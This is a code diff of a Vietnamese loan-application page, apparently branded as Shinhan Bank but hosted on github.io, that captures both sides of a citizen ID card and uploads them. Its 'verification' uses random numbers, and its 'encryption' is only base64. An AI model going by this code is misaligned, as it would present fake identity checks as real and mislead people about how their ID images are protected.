-                const brightness = (data[i] + data[i + 1] + data[i + 2]) / 3;
-                brightnessSum += brightness;
-            }
-            const avgBrightness = brightnessSum / (data.length / 4);
-
-            // Giả lập phát hiện cạnh CCCD (dựa trên độ tương phản)
-            const centerX = Math.floor(canvas.width / 2);
-            const centerY = Math.floor(canvas.height / 2);
-            const sampleSize = 50;
-            let contrast = 0;
-            for (let x = centerX - sampleSize; x < centerX + sampleSize; x++) {
-                for (let y = centerY - sampleSize; y < centerY + sampleSize; y++) {
-                    const idx = (y * canvas.width + x) * 4;
-                    const brightness = (data[idx] + data[idx + 1] + data[idx + 2]) / 3;
-                    const idxNext = ((y + 1) * canvas.width + x) * 4;
-                    const brightnessNext = (data[idxNext] + data[idxNext + 1] + data[idxNext + 2]) / 3;
-                    contrast += Math.abs(brightness - brightnessNext);
-                }
-            }
-
-            const container = document.getElementById(`${type}CameraContainer`);
-            const errorElement = document.getElementById(`${type}Error`);
-            if (avgBrightness < 50) {
-                container.classList.remove('detected');
-                errorElement.textContent = 'Ánh sáng quá tối, vui lòng chụp ở nơi sáng hơn.';
-                errorElement.style.display = 'block';
-                return false;
-            } else if (contrast < 5000) {
-                container.classList.remove('detected');
-                errorElement.textContent = 'Ảnh bị mờ hoặc không căn chỉnh đúng, vui lòng điều chỉnh lại.';
-                errorElement.style.display = 'block';
-                return false;
-            } else {
-                container.classList.add('detected');
-                errorElement.style.display = 'none';
-                return true;
-            }
-        }
-
-        async function startCamera(videoElement, type) {
+        async function startCamera(videoElement) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment' }
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'environment',
+                        width: { ideal: 1280, min: 640 },
+                        height: { ideal: 720, min: 480 },
+                        frameRate: { ideal: 30, min: 15 }
+                    } 
                 });
                 videoElement.srcObject = stream;
-                document.getElementById(`${type}CameraContainer`).classList.add('ready');
-
-                // Kiểm tra căn chỉnh liên tục
-                const checkAlignment = setInterval(() => {
-                    if (document.getElementById(`${type}CameraContainer`).style.display === 'none') {
-                        clearInterval(checkAlignment);
-                        return;
-                    }
-                    detectCCCDAlignment(videoElement, type);
-                }, 1000);
-
+                await videoElement.play();
                 return stream;
-            } catch (error) {
-                console.error('Error accessing camera:', error);
-                document.getElementById(`${type}Error`).textContent = 'Không thể truy cập camera. Vui lòng cấp quyền hoặc kiểm tra thiết bị.';
-                document.getElementById(`${type}Error`).style.display = 'block';
-                playWarningSound();
-                alert('Không thể truy cập camera. Vui lòng cấp quyền hoặc sử dụng thiết bị có camera.');
+            } catch (err) {
+                console.error('Error accessing camera:', err);
+                uploadError.innerHTML = '<i class="fas fa-times error-icon"></i> Không thể truy cập camera. Kiểm tra quyền và thiết bị.';
+                uploadError.setAttribute('data-en', '<i class="fas fa-times error-icon"></i> Cannot access camera. Check permissions and device.');
+                uploadError.style.display = 'block';
                 return null;
             }
         }
@@ -515,156 +643,305 @@
             }
         }
 
-        async function initFrontCamera() {
-            const video = document.getElementById('frontCamera');
-            frontStream = await startCamera(video, 'front');
-            if (!frontStream) return;
-
-            const captureBtn = document.getElementById('captureFrontBtn');
-            captureBtn.addEventListener('click', () => captureImage('front'));
-        }
-
-        function captureImage(type) {
-            const video = document.getElementById(`${type}Camera`);
-            const canvas = document.getElementById(`${type}Canvas`);
+        function captureImage(video, canvas, preview) {
+            if (!video || !video.videoWidth || !video.videoHeight) return null;
             const context = canvas.getContext('2d');
-            const preview = document.getElementById(`${type}Preview`);
-            const container = document.getElementById(`${type}CameraContainer`);
-
-            // Kiểm tra căn chỉnh trước khi chụp
-            if (!detectCCCDAlignment(video, type)) {
-                playWarningSound();
-                alert('Ảnh chưa đạt yêu cầu. Vui lòng căn chỉnh lại theo hướng dẫn.');
-                return;
-            }
-
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const imageData = canvas.toDataURL('image/jpeg');
-            preview.src = imageData;
-            preview.style.display = 'block';
-            document.getElementById(`${type}Status`).style.display = 'block';
-            document.getElementById(`${type}NextStep`).style.display = 'block';
-            document.getElementById(`${type}Error`).style.display = 'none';
-            document.getElementById('uploadError').style.display = 'none';
-            container.classList.remove('ready');
-            container.classList.add('captured');
-
-            if (type === 'front') {
-                frontImageData = imageData;
-                frontCaptured = true;
-                stopCamera(frontStream);
-                document.getElementById('frontCameraContainer').style.display = 'none';
-                document.getElementById('frontButtons').innerHTML = `
-                    <button class="btn btn-outline-primary" onclick="retakeImage('front')">Chụp lại</button>
-                `;
-                document.getElementById('backUpload').style.display = 'block';
-                initBackCamera();
-            } else {
-                backImageData = imageData;
-                backCaptured = true;
-                stopCamera(backStream);
-                document.getElementById('backCameraContainer').style.display = 'none';
-                document.getElementById('backButtons').innerHTML = `
-                    <button class="btn btn-outline-primary" onclick="retakeImage('back')">Chụp lại</button>
-                `;
-                document.getElementById('finalButtons').style.display = 'flex';
-            }
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
+            preview.src = dataUrl;
+            preview.classList.remove('hidden');
+            preview.classList.add('visible');
+            return dataUrl;
         }
 
-        async function retakeImage(type) {
-            const video = document.getElementById(`${type}Camera`);
-            const preview = document.getElementById(`${type}Preview`);
-            const status = document.getElementById(`${type}Status`);
-            const nextStep = document.getElementById(`${type}NextStep`);
-            const container = document.getElementById(`${type}CameraContainer`);
-            const buttons = document.getElementById(`${type}Buttons`);
-
-            preview.style.display = 'none';
-            status.style.display = 'none';
-            nextStep.style.display = 'none';
-            container.style.display = 'block';
-            container.classList.remove('captured');
-
-            if (type === 'front') {
-                frontCaptured = false;
-                frontImageData = null;
-                buttons.innerHTML = `<button class="btn btn-primary" id="captureFrontBtn">Chụp ảnh</button>`;
-                document.getElementById('captureFrontBtn').addEventListener('click', () => captureImage('front'));
-                frontStream = await startCamera(video, 'front');
-            } else {
-                backCaptured = false;
-                backImageData = null;
-                buttons.innerHTML = `
-                    <button class="btn btn-primary" id="captureBackBtn">Chụp mặt sau</button>
-                    <button class="btn btn-outline-danger" id="retakeBackBtn">Chụp lại</button>
-                `;
-                document.getElementById('captureBackBtn').addEventListener('click', () => captureImage('back'));
-                backStream = await startCamera(video, 'back');
+        function checkBrightness(canvas) {
+            const context = canvas.getContext('2d');
+            const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
+            let totalBrightness = 0;
+            for (let i = 0; i < imageData.data.length; i += 4) {
+                const r = imageData.data[i];
+                const g = imageData.data[i + 1];
+                const b = imageData.data[i + 2];
+                totalBrightness += (0.299 * r + 0.587 * g + 0.114 * b);
             }
+            const avgBrightness = totalBrightness / (imageData.data.length / 4);
+            return avgBrightness > 50;
         }
 
-        async function initBackCamera() {
-            const video = document.getElementById('backCamera');
-            backStream = await startCamera(video, 'back');
-            if (!backStream) return;
-
-            const captureBtn = document.getElementById('captureBackBtn');
-            captureBtn.addEventListener('click', () => captureImage('back'));
+        function checkBlur(canvas) {
+            const context = canvas.getContext('2d');
+            const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
+            let variance = 0;
+            let sum = 0;
+            for (let i = 0; i < imageData.data.length; i += 4) {
+                const gray = (imageData.data[i] + imageData.data[i + 1] + imageData.data[i + 2]) / 3;
+                sum += gray;
+            }
+            const mean = sum / (imageData.data.length / 4);
+            for (let i = 0; i < imageData.data.length; i += 4) {
+                const gray = (imageData.data[i] + imageData.data[i + 1] + imageData.data[i + 2]) / 3;
+                variance += Math.pow(gray - mean, 2);
+            }
+            variance = variance / (imageData.data.length / 4);
+            return variance > 20;
         }
 
-        document.getElementById('proceedBtn').addEventListener('click', async () => {
-            let isValid = true;
-            let firstErrorElement = null;
+        async function simulateVerification(type, imageData) {
+            const loader = type === 'front' ? frontLoader : backLoader;
+            loader.style.display = 'block';
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    const canvas = type === 'front' ? frontCanvas : backCanvas;
+                    const isBright = checkBrightness(canvas);
+                    const isSharp = checkBlur(canvas);
+                    const alignment = Math.random();
+                    const isAligned = alignment > 0.15;
+                    let errorMsg = '';
+                    let errorMsgEn = '';
+                    let isValid = true;
 
-            if (!frontCaptured) {
-                document.getElementById('frontError').textContent = 'Chưa chụp ảnh mặt trước CCCD!';
-                document.getElementById('frontError').style.display = 'block';
-                document.getElementById('uploadError').style.display = 'block';
-                firstErrorElement = document.getElementById('frontCameraContainer');
-                isValid = false;
-            } else {
-                document.getElementById('frontError').style.display = 'none';
-            }
+                    if (!imageData) {
+                        errorMsg = 'Không chụp được ảnh. Kiểm tra camera và thử lại.';
+                        errorMsgEn = 'Failed to capture image. Check camera and retry.';
+                        isValid = false;
+                    } else if (!isAligned) {
+                        showAlignIcons(type, alignment < 0.05 ? 'up' : alignment < 0.1 ? 'down' : alignment < 0.12 ? 'left' : 'right');
+                        errorMsg = 'Lệch khung, đưa CCCD vào giữa khung.';
+                        errorMsgEn = 'Misaligned, place ID in center of frame.';
+                        isValid = false;
+                    } else if (!isBright) {
+                        errorMsg = 'Ảnh quá tối, tăng ánh sáng và chụp lại.';
+                        errorMsgEn = 'Image too dark, increase lighting and retry.';
+                        isValid = false;
+                    } else if (!isSharp) {
+                        errorMsg = 'Ảnh mờ, giữ máy ổn định và chụp lại.';
+                        errorMsgEn = 'Image blurry, hold device steady and retry.';
+                        isValid = false;
+                    }
 
-            if (!backCaptured) {
-                document.getElementById('backError').textContent = 'Chưa chụp ảnh mặt sau CCCD!';
-                document.getElementById('backError').style.display = 'block';
-                document.getElementById('uploadError').style.display = 'block';
-                if (!firstErrorElement) firstErrorElement = document.getElementById('backCameraContainer');
-                isValid = false;
-            } else {
-                document.getElementById('backError').style.display = 'none';
-            }
+                    loader.style.display = 'none';
+                    resolve({ isValid, errorMsg, errorMsgEn });
+                }, 1500);
+            });
+        }
 
-            if (!isValid) {
-                playWarningSound();
-                alert('Vui lòng chụp cả mặt trước và mặt sau CCCD!');
-                if (firstErrorElement) {
-                    firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        function showAlignIcons(type, direction) {
+            const alignIcons = type === 'front' ? 
+                { up: frontAlignUp, down: frontAlignDown, left: frontAlignLeft, right: frontAlignRight } :
+                { up: backAlignUp, down: backAlignDown, left: backAlignLeft, right: backAlignRight };
+            Object.values(alignIcons).forEach(icon => icon.classList.add('hidden'));
+            alignIcons[direction].classList.remove('hidden');
+            alignIcons[direction].classList.add('visible');
+        }
+
+        async function autoCapture(type, video, canvas, preview, status, success, checkIcon, nextBtn, captureBtn) {
+            status.classList.remove('hidden');
+            status.classList.add('visible');
+            const frame = type === 'front' ? frontFrame : backFrame;
+            frame.classList.add('blink');
+            let attempts = 0;
+            while (attempts < 5) {
+                const imageData = captureImage(video, canvas, preview);
+                const { isValid, errorMsg, errorMsgEn } = await simulateVerification(type, imageData);
+                if (isValid) {
+                    success.classList.remove('hidden');
+                    success.classList.add('visible');
+                    checkIcon.classList.remove('error');
+                    if (type === 'front') frontVerified = true;
+                    else backVerified = true;
+                    saveProgress();
+                    captureBtn.classList.add('hidden');
+                    if (type === 'front') {
+                        nextBtn.classList.remove('hidden');
+                        nextBtn.classList.add('visible');
+                        topBanner.classList.remove('hidden');
+                        topBanner.classList.add('visible');
+                        fixedBottomBar.classList.remove('hidden');
+                        fixedBottomBar.classList.add('visible');
+                    } else if (frontVerified && backVerified) {
+                        proceedBtn.disabled = false;
+                    }
+                    break;
+                } else {
+                    checkIcon.classList.add('error');
+                    preview.classList.add('error');
+                    uploadError.innerHTML = '<i class="fas fa-times error-icon"></i> ' + errorMsg;
+                    uploadError.setAttribute('data-en', '<i class="fas fa-times error-icon"></i> ' + errorMsgEn);
+                    uploadError.style.display = 'block';
+                    attempts++;
+                    await new Promise(resolve => setTimeout(resolve, 1000));
                 }
+            }
+            frame.classList.remove('blink');
+            status.classList.add('hidden');
+        }
+
+        async function showFrontCapture() {
+            guideSection.classList.add('hidden');
+            frontSection.classList.remove('hidden');
+            frontSection.classList.add('visible');
+            backSection.classList.add('hidden');
+            frontStream = await startCamera(frontVideo);
+            if (frontStream) {
+                setTimeout(() => autoCapture('front', frontVideo, frontCanvas, frontPreview, frontStatus, frontSuccess, frontCheckIcon, nextToBackBtn, captureFrontBtn), 1500);
+            }
+        }
+
+        async function showBackCapture() {
+            if (!frontVerified) {
+                uploadError.innerHTML = '<i class="fas fa-times error-icon"></i> Vui lòng xác minh mặt trước trước.';
+                uploadError.setAttribute('data-en', '<i class="fas fa-times error-icon"></i> Please verify front side first.');
+                uploadError.style.display = 'block';
                 return;
             }
-
-            try {
-                document.getElementById('proceedBtn').disabled = true;
-                document.getElementById('proceedBtn').innerHTML = 'ĐANG XỬ LÝ';
-                await new Promise(resolve => setTimeout(resolve, 500));
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step3.html';
-            } catch (error) {
-                console.error('Error proceeding to step 3:', error);
-                alert('Lỗi xảy ra. Vui lòng thử lại.');
-            } finally {
-                document.getElementById('proceedBtn').disabled = false;
-                document.getElementById('proceedBtn').innerHTML = 'TIẾP THEO';
+            guideSection.classList.add('hidden');
+            frontSection.classList.add('hidden');
+            backSection.classList.remove('hidden');
+            backSection.classList.add('visible');
+            stopCamera(frontStream);
+            frontStream = null;
+            backStream = await startCamera(backVideo);
+            if (backStream) {
+                setTimeout(() => autoCapture('back', backVideo, backCanvas, backPreview, backStatus, backSuccess, backCheckIcon, null, captureBackBtn), 1500);
             }
-        });
+        }
 
-        window.onload = () => {
-            initFrontCamera();
-        };
+        function captureFront() {
+            if (!frontStream) {
+                uploadError.innerHTML = '<i class="fas fa-times error-icon"></i> Camera chưa sẵn sàng. Thử lại.';
+                uploadError.setAttribute('data-en', '<i class="fas fa-times error-icon"></i> Camera not ready. Try again.');
+                uploadError.style.display = 'block';
+                return;
+            }
+            autoCapture('front', frontVideo, frontCanvas, frontPreview, frontStatus, frontSuccess, frontCheckIcon, nextToBackBtn, captureFrontBtn);
+        }
+
+        function captureBack() {
+            if (!backStream) {
+                uploadError.innerHTML = '<i class="fas fa-times error-icon"></i> Camera chưa sẵn sàng. Thử lại.';
+                uploadError.setAttribute('data-en', '<i class="fas fa-times error-icon"></i> Camera not ready. Try again.');
+                uploadError.style.display = 'block';
+                return;
+            }
+            autoCapture('back', backVideo, backCanvas, backPreview, backStatus, backSuccess, backCheckIcon, null, captureBackBtn);
+        }
+
+        function saveProgress() {
+            try {
+                localStorage.setItem('frontVerified', frontVerified);
+                localStorage.setItem('backVerified', backVerified);
+            } catch (err) {
+                console.error('Error saving to localStorage:', err);
+            }
+        }
+
+        function loadProgress() {
+            try {
+                frontVerified = localStorage.getItem('frontVerified') === 'true';
+                backVerified = localStorage.getItem('backVerified') === 'true';
+                if (frontVerified && backVerified) {
+                    proceedBtn.disabled = false;
+                }
+                if (!guideSection.classList.contains('hidden')) {
+                    topBanner.classList.add('hidden');
+                    fixedBottomBar.classList.add('hidden');
+                }
+            } catch (err) {
+                console.error('Error loading from localStorage:', err);
+            }
+        }
+        window.addEventListener('load', loadProgress);
+
+        function encryptImageData(dataUrl) {
+            try {
+                return btoa(dataUrl);
+            } catch (err) {
+                console.error('Error encrypting image data:', err);
+                return null;
+            }
+        }
+
+        async function uploadImages() {
+            const loader = document.createElement('div');
+            loader.className = 'loader';
+            document.querySelector('.fixed-bottom-bar').appendChild(loader);
+            loader.style.display = 'block';
+            const frontData = encryptImageData(frontPreview.src);
+            const backData = encryptImageData(backPreview.src);
+            if (!frontData || !backData) {
+                loader.remove();
+                uploadError.innerHTML = '<i class="fas fa-times error-icon"></i> Lỗi xử lý ảnh. Thử lại.';
+                uploadError.setAttribute('data-en', '<i class="fas fa-times error-icon"></i> Image processing error. Try again.');
+                uploadError.style.display = 'block';
+                return false;
+            }
+            const formData = new FormData();
+            formData.append('frontImage', frontData);
+            formData.append('backImage', backData);
+            try {
+                const response = await fetch('https://api.shinhan.com.vn/upload', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'Bearer YOUR_SECURE_TOKEN'
+                    },
+                    body: formData
+                });
+                if (response.ok) {
+                    loader.remove();
+                    return true;
+                }
+                throw new Error('Upload failed');
+            } catch (err) {
+                console.error('Upload error:', err);
+                loader.remove();
+                uploadError.innerHTML = '<i class="fas fa-times error-icon"></i> Lỗi tải ảnh lên. Thử lại.';
+                uploadError.setAttribute('data-en', '<i class="fas fa-times error-icon"></i> Upload failed. Please try again.');
+                uploadError.style.display = 'block';
+                return false;
+            }
+        }
+
+        async function proceedToStep3() {
+            if (frontVerified && backVerified) {
+                stopCamera(frontStream);
+                stopCamera(backStream);
+                frontStream = null;
+                backStream = null;
+                const uploaded = await uploadImages();
+                if (uploaded) {
+                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step3.html';
+                }
+            } else {
+                uploadError.innerHTML = '<i class="fas fa-times error-icon"></i> Vui lòng xác minh cả hai mặt.';
+                uploadError.setAttribute('data-en', '<i class="fas fa-times error-icon"></i> Please verify both sides.');
+                uploadError.style.display = 'block';
+            }
+        }
+
+        function switchLanguage(lang) {
+            const elements = document.querySelectorAll('[data-en]');
+            const originalTexts = {};
+            elements.forEach(el => {
+                if (!el.dataset.originalText) {
+                    el.dataset.originalText = el.innerHTML;
+                }
+                originalTexts[el] = el.dataset.originalText;
+                if (lang === 'en') {
+                    el.innerHTML = el.getAttribute('data-en');
+                } else {
+                    el.innerHTML = el.dataset.originalText;
+                }
+            });
+        }
+
+        proceedBtn.addEventListener('click', proceedToStep3);
+
+        window.addEventListener('unload', () => {
+            stopCamera(frontStream);
+            stopCamera(backStream);
+        });
     </script>
 </body>
 </html>
